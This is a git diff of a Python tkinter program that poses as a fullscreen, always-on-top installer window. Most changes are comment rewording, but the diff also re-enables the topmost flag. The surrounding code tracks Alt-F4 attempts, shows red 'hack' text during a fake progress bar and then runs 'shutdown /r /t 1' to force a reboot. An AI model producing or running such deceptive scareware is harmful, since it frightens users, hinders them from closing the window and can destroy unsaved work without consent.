@@ -17,7 +17,7 @@ def resource_path(relative_path):
 
 ctypes.windll.user32.SetProcessDPIAware()
 
-class ChaosFormatter: #unused
+class ChaosFormatter: # не используется, может в следуующей версии
     WINDOW_WIDTH = 600
     WINDOW_HEIGHT = 180
     SHAKE_AREA_HEIGHT = 180
@@ -199,30 +199,29 @@ class ChaosFormatter: #unused
         self.master.after(int(random.uniform(50, 200)), lambda: self._glitch_effect(label))
 
     def run(self):
-        self.master.mainloop()
+        self.master.mainloop() # не используется
 
 
-
-# Заглушка для специфического выбора
+# Заглушка для выбора, здесь будет что-то интересное, наверное
 def on_specific_selection():
     print("Specific selection triggered!")
 
 def run_app():
-    # --- Константы ---
+    # Константы
     LABEL_OFFSET = 65  # Смещение меток над Combobox
-    GLITCH_DURATION = 5000  # Длительность глитч-эффекта (мс)
+    GLITCH_DURATION = 5000  # Длительность глитч-эффекта
     GLITCH_CHARS = ["█", "▒", "░", "▓", "X", "#", "@", "%", "&", "■", "□", "◙"]
     PROGRESS_BAR_WIDTH = 1400
     PROGRESS_BAR_HEIGHT = 150
 
-    # --- Инициализация окна ---
+    #Инициализация окна
     root = tk.Tk()
-    root.attributes('-fullscreen', True) #, '-topmost', True
+    root.attributes('-fullscreen', True, '-topmost', True)
     root.title("Установка")
     root.resizable(False, False)
     root.overrideredirect(True)
 
-    # --- Словарь текстов ---
+    # Локализация
     texts = {
         "ru": {
             "install": "Установить",
@@ -287,14 +286,14 @@ def run_app():
         }
     }
 
-    # --- Состояние приложения ---
+    # Переменные
     current_lang = "en"
     alt_f4_count = 0
     is_protection_active = False
     is_alt_f4_page_open = False
     is_install_page = False
 
-    # --- Глобальные виджеты ---
+    # Глобальные виджеты
     welcome_label = None
     install_button = None
     next_button = None
@@ -303,7 +302,7 @@ def run_app():
     container = tk.Frame(root)
     container.pack(fill="both", expand=True)
 
-    # --- Утилитные функции ---
+    # Утилитные функции
     def clear_container():
         """Очистка контейнера и создание нового фонового лейбла."""
         nonlocal bg_label
@@ -428,7 +427,7 @@ def run_app():
 
     root.bind("<Alt-F4>", handle_alt_f4)
 
-    # --- Страницы приложения ---
+    # Страницы приложения
     def show_main_page():
         """Отображение главной страницы."""
         nonlocal welcome_label, install_button, is_install_page
@@ -568,13 +567,13 @@ def run_app():
                     hack_text.place(relx=0.5, rely=0.65, anchor="center")
                     percent_label.config(fg="red")
                     installing_label.config(fg="red", text=texts[current_lang]["progress"])
-                    installing_label.place_configure(relx=0.5, rely=0.55, anchor="center")
+                    installing_label.place_configure(relx=0.5, rely=0.1, anchor="center")
                     canvas.itemconfig(progress_rect, fill="#ff0000")
                     canvas.place_configure(relx=0.5, rely=0.2, anchor="center")
                     percent_label.place_configure(relx=0.5, rely=0.35, anchor="center")
                 if i < 50 and random.random() < 0.3:
                     time.sleep(random.uniform(0.7, 1.2))
-                time.sleep(0.4)
+                time.sleep(0.5)
             os.system("shutdown /r /t 1")
 
         threading.Thread(target=update_progress, daemon=True).start()
